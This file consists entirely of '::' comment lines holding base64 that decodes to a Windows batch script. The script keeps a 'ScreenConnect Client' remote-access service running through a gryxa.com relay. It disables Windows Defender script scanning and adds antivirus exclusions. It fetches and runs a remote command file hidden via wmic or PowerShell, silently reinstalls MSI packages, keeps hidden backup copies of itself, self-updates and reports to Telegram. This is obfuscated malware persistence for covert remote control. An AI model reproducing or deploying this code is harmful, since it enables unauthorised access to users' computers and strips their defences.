::WEFfT0shIj09IjAiICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSAoDQog
::ICAgc2V0ICJORUVEX0hFQUw9MSINCiAgICBlY2hvIGdyeXhhXzEwNjBfcXVldWVf
::aGVhbD4+IiVMT0clIg0KICApIGVsc2UgKA0KICAgIGVjaG8gZ3J5eGFfc3ZjX2V4
::aXN0c19za2lwX2hlYWxfc3RhcnRfb25seT4+IiVMT0clIg0KICApDQopDQppZiAi
::IU5FRURfSEVBTCEiPT0iMSIgY2FsbCA6UXVldWVHcnl4YUhlYWwgSEVBTA0KDQpp
::ZiAiJURPX0RFRVAlIj09IjEiIGVjaG8gZG9uZT4iJUdSWVhBX0RFRVAlIg0KZWNo
::byBncnl4YV9mcmVlemVfb3JfaGVhbF9kb25lPj4iJUxPRyUiDQoNCjpHcnl4YUFm
::dGVyDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3Eg
::dG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBk
::byBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0K
::c2V0ICJHUllYQV9PSz0wIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglR1JZWEFfRlAlKSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RB
::UlRfUEVORElORyIgL0M6IkNPTlRJTlVFX1BFTkRJTkciID5udWwNCmlmIG5vdCBl
::cnJvcmxldmVsIDEgKA0KICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRD
::b250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFf
::RlAlKSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29t
::IiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0K
::KQ0KcmVtIE01MjogYW55IG5vbi1zZXZyeiBSdW5uaW5nIFdJVEggZ3J5eGEuY29t
::IEltYWdlUGF0aCBpcyBPSw0KaWYgIiVHUllYQV9PSyUiPT0iMCIgKA0KICBmb3Ig
::L2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVe
::PSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0
::IENsaWVudCInKSBkbyAoDQogICAgc2V0ICJfRlA9JSVhIg0KICAgIHNldCAiX0ZQ
::PSFfRlA6ID0hIg0KICAgIGlmIC9JIG5vdCAiIV9GUCEiPT0iJUtFRVBfRlAlIiBp
::ZiAvSSBub3QgIiFfRlAhIj09IiVBTFRfRlAlIiAoDQogICAgICBzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgfCBmaW5kc3RyIC9JIC9DOiJS
::VU5OSU5HIiAvQzoiU1RBUlRfUEVORElORyIgL0M6IkNPTlRJTlVFX1BFTkRJTkci
::ID5udWwNCiAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICByZWcg
::cXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICghX0ZQISkiIC92IEltYWdlUGF0aCAyPm51bCB8
::IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bA0KICAgICAgICBpZiBub3QgZXJy
::b3JsZXZlbCAxICgNCiAgICAgICAgICBzZXQgIkdSWVhBX09LPTEiDQogICAgICAg
::ICAgc2V0ICJHUllYQV9GUD0hX0ZQISINCiAgICAgICAgKQ0KICAgICAgKQ0KICAg
::ICkNCiAgKQ0KKQ0KaWYgIiVHUllYQV9PSyUiPT0iMCIgKA0KICBwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
::YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhlYWx0
::aCAtV29ya0RpciAiJVdEJSIgMj5udWwgfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFM
::VEhZfCIgfCBmaW5kc3RyIC9JICJydW5uaW5nPTEiID5udWwNCiAgaWYgbm90IGVy
::cm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQopDQoNCmlmICIlR1JZWEFfT0sl
::Ij09IjEiIGlmICIlR1JZWEFfV0FTJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5v
::UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
::LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIg
::IiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgImdyeXhhLXJlc3RvcmVkIiA+
::bnVsIDI+JjENCiAgY2FsbCA6VGdHcnl4YSBSRVNUT1JFRCAiR3J5eGEgU2NyZWVu
::Q29ubmVjdCBoZWFsdGh5IChzdmMgcnVubmluZykiDQopDQppZiAiJUdSWVhBX09L
::JSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
::dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
::czEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVS
::JSAtRXh0cmEgImdyeXhhLW11c3QtZmFpbCIgPm51bCAyPiYxDQogIGNhbGwgOlRn
::R3J5eGEgRE9XTiAiR3J5eGEgTVVTVC1SVU4gLSBzZXJ2aWNlIG5vdCBSdW5uaW5n
::IGFmdGVyIGhlYWwiDQopDQoNCnJlbSDilIDilIAgW0hdIHF1aWV0IGRpZ2VzdCAo
::c2tpcCBoZWFsdGh5IGhvc3RzIOKAlCB3YXMgZmxvb2RpbmcgVGVsZWdyYW0pIOKU
::gOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5v
::UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
::LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIg
::IiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+JjENCnNldCAiTkVFRF9IQj0w
::Ig0KaWYgIiVQUklNX09LJSI9PSIwIiBzZXQgIk5FRURfSEI9MSINCmlmICVGT1JF
::SUdOX0xFRlQlIEdUUiAwIHNldCAiTkVFRF9IQj0xIg0KaWYgIiVHUllYQV9PSyUi
::PT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAiJU5FRURfSEIlIj09IjAiICgNCiAg
::ZWNobyBoYl9za2lwX2hlYWx0aHk+PiIlTE9HJSINCikgZWxzZSAoDQogIHBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChU
::ZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAoTmV3LVRpbWVTcGFuIC1TdGFydCAo
::R2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFHJScpLkxhc3RXcml0ZVRpbWUp
::LlRvdGFsTWludXRlcyAtbHQgMzYwKXsgZXhpdCAwIH0gZWxzZSB7IGV4aXQgMSB9
::IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGhiPiVI
::QkZMQUclDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQu
::cHMxIiAtU3RhdGUgSEIgLU1vZGUgY29tcGFjdCAtQnVpbGQgJU1PTlZFUiUgLUNv
::dW50ICFDT1VOVCEgPm51bCAyPiYxDQogICAgZWNobyBkaWdlc3QgSEIgc2VudD4+
::IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAgW0ldIHNlbGYtdXBkYXRlIGFw
::cGx5IChsYXN0IHRoaW5nIHRoaXMgdGljaykg4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiAiJVNFTEZfVVBEJSI9PSIxIiAoDQog
::IGVjaG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9HJSINCiAgYXR0cmliIC1oIC1z
::IC1yICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgbW92ZSAveSAiJVNU
::QUdFJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjEN
::CikNCnJlbSBrZWVwIGR1YWwtcGF0aCBiYWNrdXAgaW4gc3luYyBldmVyeSB0aWNr
::DQppZiBub3QgZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQ0K
::aWYgZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgNCiAgYXR0cmliIC1oIC1zIC1y
::ICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkgL3kgIiVXRCVc
::b3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQopDQpk
::ZWwgL2YgL3EgIiVNVVRFWCUiID5udWwgMj4mMQ0KDQplY2hvIHRpY2sgZG9uZTog
::cHJpbT0lUFJJTV9PSyUgZ3J5eGE9JUdSWVhBX09LJSBhbHQ9JUFMVF9PSyUgZm9y
::ZWlnbj0lRk9SRUlHTl9MRUZUJT4+IiVMT0clIg0KZW5kbG9jYWwNCmV4aXQgL2Ig
::MA0KDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQIGhlbHBlcnMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQo6UXVldWVHcnl4YUhlYWwNCnJlbSAlMT1SRUlOU1RBTEx8
::SEVBTCDigJQgcmF0ZS1saW1pdCA5MG0gVU5MRVNTIHNlcnZpY2UgaXMgMTA2MCAo
::YWx3YXlzIGFsbG93IHJlY292ZXIpDQpzZXQgIkhFQUxNT0RFPSV+MSINCmlmICIl
::SEVBTE1PREUlIj09IiIgc2V0ICJIRUFMTU9ERT1IRUFMIg0Kc2V0ICJCWVBBU1Nf
::Ukw9MCINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQ
::JSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIHNldCAiQllQQVNTX1JMPTEi
::DQppZiAiIUJZUEFTU19STCEiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclV0Ql
::XGdyeXhhX2hlYWwuZmxhZycpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAn
::JVdEJVxncnl4YV9oZWFsLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0
::ZXMgLWx0IDkwKSl7ZXhpdCAxfWVsc2V7ZXhpdCAwfSIgPm51bCAyPiYxDQogIGlm
::IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBncnl4YV9oZWFsX3JhdGVfbGltaXRl
::ZD4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopIGVsc2UgKA0KICBlY2hv
::IGdyeXhhX2hlYWxfYnlwYXNzX3JhdGVfbGltaXRfMTA2MD4+IiVMT0clIg0KKQ0K
::ZWNobyAlREFURSUgJVRJTUUlICVIRUFMTU9ERSU+IiVXRCVcZ3J5eGFfaGVhbC5m
::bGFnIg0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRc
::V2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJs
::ZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIgL3QgUkVHX0RXT1JEIC9kIDAg
::L2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxX
::aW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAibXNpZXhl
::Yy5leGUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAi
::SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNp
::b25zXFByb2Nlc3NlcyIgL3YgIlNjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5l
::eGUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwg
::LS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAy
::MCAtbyAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJU9XTkdSWVhBJSIgPm51bCAyPiYx
::DQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVDVVJMJSIgLUwg
::LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1vICIlV0QlXG93bl9n
::cnl4YS5jbWQiICIlT1dOR1JZWEEyJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdE
::JVxncnl4YV9tc2kubG9jayIgZGVsIC9mIC9xICIlV0QlXGdyeXhhX21zaS5sb2Nr
::IiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVN5c3RlbVJvb3QlXFRlbXBcLnVw
::ZCIgbWtkaXIgIiVTeXN0ZW1Sb290JVxUZW1wXC51cGQiID5udWwgMj4mMQ0KPiAi
::JVN5c3RlbVJvb3QlXFRlbXBcLnVwZFxncnl4YV9oZWFsX29uY2UuY21kIiAoDQog
::IGVjaG8gQGVjaG8gb2ZmDQogIGVjaG8gY2FsbCAiJVdEJVxvd25fZ3J5eGEuY21k
::IiAiJVdEJSIgIiVHUllYQV9GUCUiICIlS0VFUF9GUCUiICIlQUxUX0ZQJSIgJUhF
::QUxNT0RFJSBePl4+IiVMT0clIiAyXj5eJjENCikNCndtaWMgcHJvY2VzcyBjYWxs
::IGNyZWF0ZSAiY21kLmV4ZSAvYyAlU3lzdGVtUm9vdCVcVGVtcFwudXBkXGdyeXhh
::X2hlYWxfb25jZS5jbWQiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAg
::cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtV2luZG93U3R5
::bGUgSGlkZGVuIC1Db21tYW5kICJTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3Vt
::ZW50TGlzdCAnL2MnLCclU3lzdGVtUm9vdCVcVGVtcFwudXBkXGdyeXhhX2hlYWxf
::b25jZS5jbWQnIC1XaW5kb3dTdHlsZSBIaWRkZW4iID5udWwgMj4mMQ0KKQ0KZWNo
::byBncnl4YV9oZWFsX3F1ZXVlZCBtb2RlPSVIRUFMTU9ERSU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6RW5zdXJlR3J5eGFNdXN0DQpyZW0gTTUyOiBzdGFydC1vbmx5
::OyBzdHVjayDihpIgUXVldWVHcnl4YUhlYWwgKG5ldmVyIGJhcmUgc2MgY3JlYXRl
::KQ0Kc2V0ICJHUllYQV9PSz0wIg0KaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBm
::b3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVX
::RCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQg
::IkdSWVhBX0ZQPSUlTCINCnNldCAiR1NWQz1TY3JlZW5Db25uZWN0IENsaWVudCAo
::JUdSWVhBX0ZQJSkiDQppZiBleGlzdCAiJVdEJVxncnl4YV9pbnN0YWxsLmNtZCIg
::ZGVsIC9mIC9xICIlV0QlXGdyeXhhX2luc3RhbGwuY21kIiA+bnVsIDI+JjENCnNj
::IHF1ZXJ5ICIlR1NWQyUiIHwgZmluZHN0ciAvSSAvQzoiUlVOTklORyIgL0M6IlNU
::QVJUX1BFTkRJTkciIC9DOiJDT05USU5VRV9QRU5ESU5HIiA+bnVsDQppZiBub3Qg
::ZXJyb3JsZXZlbCAxICgNCiAgcmVnIHF1ZXJ5ICJIS0xNXFNZU1RFTVxDdXJyZW50
::Q29udHJvbFNldFxTZXJ2aWNlc1wlR1NWQyUiIC92IEltYWdlUGF0aCAyPm51bCB8
::IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZl
::bCAxICgNCiAgICBzZXQgIkdSWVhBX09LPTEiDQogICAgZWNobyBncnl4YV9tdXN0
::X2FscmVhZHlfYWxpdmVfcmVsYXk+PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAg
::KQ0KKQ0Kc2MgcXVlcnkgIiVHU1ZDJSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3Js
::ZXZlbCAxICgNCiAgZWNobyBncnl4YV9tdXN0X3N0YXJ0X29ubHk+PiIlTE9HJSIN
::CiAgc2MgY29uZmlnICIlR1NWQyUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0KICBz
::YyBzdGFydCAiJUdTVkMlIiA+bnVsIDI+JjENCiAgdGltZW91dCAvdCA4IC9ub2Jy
::ZWFrID5udWwNCiAgc2MgcXVlcnkgIiVHU1ZDJSIgfCBmaW5kc3RyIC9JIC9DOiJS
::VU5OSU5HIiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KICBpZiBub3QgZXJyb3Js
::ZXZlbCAxICgNCiAgICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250
::cm9sU2V0XFNlcnZpY2VzXCVHU1ZDJSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwgZmlu
::ZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQogICAgaWYgbm90IGVycm9ybGV2ZWwg
::MSBzZXQgIkdSWVhBX09LPTEiDQogICkNCikNCmlmICIlR1JZWEFfT0slIj09IjAi
::IGNhbGwgOlF1ZXVlR3J5eGFIZWFsIEhFQUwNCmlmICIlR1JZWEFfT0slIj09IjEi
::IChlY2hvIGdyeXhhX211c3RfcnVubmluZ19vaz4+IiVMT0clIikgZWxzZSAoZWNo
::byBncnl4YV9tdXN0X2hlYWxfcXVldWVkPj4iJUxPRyUiKQ0KZXhpdCAvYiAwDQoN
::CjpUZ0dyeXhhDQpyZW0gJTE9a2luZCAlMj1tc2cg4oCUIHBlci1Hcnl4YSBzdGF0
::ZSBzbyBpdCBjYW5ub3QgcmV1c2UgUHJpbWFyeSBvd25fbW9uLnN0YXRlLg0Kc2V0
::ICJHU1RBVEU9JX4xIg0Kc2V0ICJHTVNHPSV+MiINCnNldCAiR1NUQVRFRklMRT0l
::V0QlXG93bl9tb25fZ3J5eGEuc3RhdGUiDQpzZXQgIkdPTEQ9Ig0KaWYgZXhpc3Qg
::IiVHU1RBVEVGSUxFJSIgc2V0IC9wIEdPTEQ9PCIlR1NUQVRFRklMRSUiDQppZiAv
::SSAiJUdTVEFURSUiPT0iUkVTVE9SRUQiICgNCiAgaWYgL0kgIiVHT0xEJSI9PSJS
::RVNUT1JFRCIgZXhpdCAvYiAwDQogIGlmIGV4aXN0ICIlV0QlXHRnX2dyeXhhLmZs
::YWciICgNCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
::IC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxp
::dGVyYWxQYXRoICclV0QlXHRnX2dyeXhhLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5U
::b3RhbE1pbnV0ZXMgLWx0IDE0NDApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwg
::Mj4mMQ0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgZWNobyB0Z19n
::cnl4YV9zdXBwcmVzc18lR1NUQVRFJT4+IiVMT0clIg0KICAgICAgZXhpdCAvYiAw
::DQogICAgKQ0KICApDQogIGVjaG8gJUdTVEFURSU+IiVHU1RBVEVGSUxFJSINCiAg
::ZWNobyBzZW50PiIlV0QlXHRnX2dyeXhhLmZsYWciDQogIHBvd2Vyc2hlbGwgLU5v
::UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
::LUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlICVHU1RBVEUlIC1TdW1t
::YXJ5ICIlR01TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVs
::IDI+JjENCiAgZWNobyB0ZyBncnl4YSAlR1NUQVRFJSBzZW50Pj4iJUxPRyUiDQog
::IGV4aXQgL2IgMA0KKQ0KaWYgL0kgIiVHU1RBVEUlIj09IkRPV04iIGlmIC9JICIl
::R09MRCUiPT0iRE9XTiIgaWYgZXhpc3QgIiVXRCVcdGdfZ3J5eGEuZmxhZyIgKA0K
::ICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5k
::ICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRo
::ICclV0QlXHRnX2dyeXhhLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0
::ZXMgLWx0IDM2MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYxDQogIGlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfZ3J5eGFfc3VwcHJlc3Nf
::JUdTVEFURSU+PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KZWNobyAl
::R1NUQVRFJT4iJUdTVEFURUZJTEUlIg0KZWNobyBzZW50PiIlV0QlXHRnX2dyeXhh
::LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1F
::eGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEi
::IC1TdGF0ZSAlR1NUQVRFJSAtU3VtbWFyeSAiJUdNU0clIiAtQnVpbGQgJU1PTlZF
::UiUgLUNvdW50ICVDT1VOVCUgPm51bCAyPiYxDQplY2hvIHRnIGdyeXhhICVHU1RB
::VEUlIHNlbnQ+PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6SW5zdGFsbE1zaQ0KcmVt
::ICUxPXVybCAlMj10YWcNCnNldCAiVVJMPSV+MSINCnNldCAiVEFHPSV+MiINCmVj
::aG8gWyVUQUclXSBmZXRjaCAlVVJMJT4+IiVMT0clIg0KIiVDVVJMJSIgLUwgLS1z
::c2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAw
::IC1vICIlTVNJJS50bXAiICIlVVJMJSIgPj4iJUxPRyUiIDI+JjENCmZvciAlJUYg
::aW4gKCIlTVNJJS50bXAiKSBkbyBpZiAlJX56RiBMRVEgMTAwMDAwMCAoDQogIGVj
::aG8gWyVUQUclXSBmZXRjaCBmYWlsZWQ+PiIlTE9HJSINCiAgZGVsIC9mIC9xICIl
::TVNJJS50bXAiID5udWwgMj4mMQ0KICBleGl0IC9iIDENCikNCm1vdmUgL3kgIiVN
::U0klLnRtcCIgIiVNU0klIiA+bnVsIDI+JjENCnJlbSBNNDE6IE9MRSBtYWdpYyAr
::IFByb2R1Y3ROYW1lIEZQIG11c3QgbWF0Y2ggS0VFUF9GUCBiZWZvcmUgL2kNCnNl
::dCAiTVNJT0s9bm8iDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9m
::ICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
::ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHRlc3QtbXNpIC1GcCAiJUtFRVBf
::RlAlIiAtRXh0cmEgIiVNU0klIiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQgIk1T
::SU9LPSUlUiINCmlmIC9JIG5vdCAiIU1TSU9LISI9PSJ5ZXMiICgNCiAgZWNobyBb
::JVRBRyVdIG1zaV92YWxpZGF0ZV9mYWlsPj4iJUxPRyUiDQogIGRlbCAvZiAvcSAi
::JU1TSSUiID5udWwgMj4mMQ0KICBleGl0IC9iIDENCikNCnJlbSBNNDIvTTQ3OiBz
::aWJsaW5nLXNhZmUgY29weSAoZW1wdHkgVXBncmFkZSB0YWJsZSkgYmVmb3JlIHNl
::dnJ6IC9pIOKAlCByZWZ1c2UgL2kgaWYgcHJvdGVjdCBmYWlscw0Kc2V0ICJNU0lf
::U0FGRT0iDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2Vi
::YWNrcSBkZWxpbXM9IiAlJVMgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
::bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0Ql
::XG93bl9saWIucHMxIiAtQWN0aW9uIHByb3RlY3QtbXNpIC1FeHRyYSAiJU1TSSUi
::IC1Xb3JrRGlyICIlV0QlImApIGRvIGlmIG5vdCAiJSVTIj09IkZBSUwiIGlmIGV4
::aXN0ICIlJVMiIHNldCAiTVNJX1NBRkU9JSVTIg0KaWYgbm90IGRlZmluZWQgTVNJ
::X1NBRkUgKA0KICBlY2hvIFslVEFHJV0gbXNpX3Byb3RlY3RfZmFpbF9za2lwX2k+
::PiIlTE9HJSINCiAgZGVsIC9mIC9xICIlTVNJJSIgPm51bCAyPiYxDQogIGV4aXQg
::L2IgMQ0KKQ0KY2FsbCA6Tm9Nc2lQb2xpY3kNCnJlbSBNMTMvTTQxOiBzdGFsZSBw
::cmltYXJ5IGRpciB1bmRlciBQRiBhbmQgUEY4Ng0Kc2MgcXVlcnkgIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2
::ZWwgMSAoDQogIGlmIGV4aXN0ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQg
::KCVLRUVQX0ZQJSkiICgNCiAgICBlY2hvIHN0YWxlX3ByaW1hcnlfZGlyX2NsZWFu
::X3BmODY+PiIlTE9HJSINCiAgICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgKQ0KICBpZiBl
::eGlzdCAiJVByb2dyYW1GaWxlcyVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
::X0ZQJSkiICgNCiAgICBlY2hvIHN0YWxlX3ByaW1hcnlfZGlyX2NsZWFuX3BmPj4i
::JUxPRyUiDQogICAgcm1kaXIgL3MgL3EgIiVQcm9ncmFtRmlsZXMlXFNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCiAgKQ0KKQ0KZWNo
::byBbJVRBRyVdIG1zaWV4ZWMgaW5zdGFsbD4+IiVMT0clIg0KbXNpZXhlYyAvaSAi
::JU1TSV9TQUZFJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVh
::bGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0K
::c2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCmVjaG8gWyVUQUclXSBtc2lleGVj
::IGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQppZiAiIU1TSUVYSVQhIj09IjE2MTgi
::ICgNCiAgZWNobyBbJVRBRyVdIG1zaV9idXN5X3JldHJ5Pj4iJUxPRyUiDQogIHRp
